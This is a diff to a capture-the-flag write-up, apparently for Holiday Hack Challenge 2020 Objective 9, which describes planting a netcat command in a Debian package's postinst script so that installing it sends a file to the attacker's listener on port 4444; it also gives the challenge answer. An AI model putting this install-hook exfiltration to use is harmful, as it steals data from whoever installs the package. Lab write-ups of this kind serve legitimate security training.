@@ -26,12 +26,13 @@ This package was modified to include this line in the postinst script:
 
     /bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
 
+and then made available in the web tree.
 That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the attacking host, which has to run the command
 
     nc -lvp 4444 > text
 to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt).
 In this file can be found that **Tanta Kringle** recused herself from the vote.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTc1NzgyOTc5MiwtODc4MzkyMjE2LDUxND
-IwOTE1OV19
+eyJoaXN0b3J5IjpbLTIwOTc2OTYyMTIsLTg3ODM5MjIxNiw1MT
+QyMDkxNTldfQ==
 -->
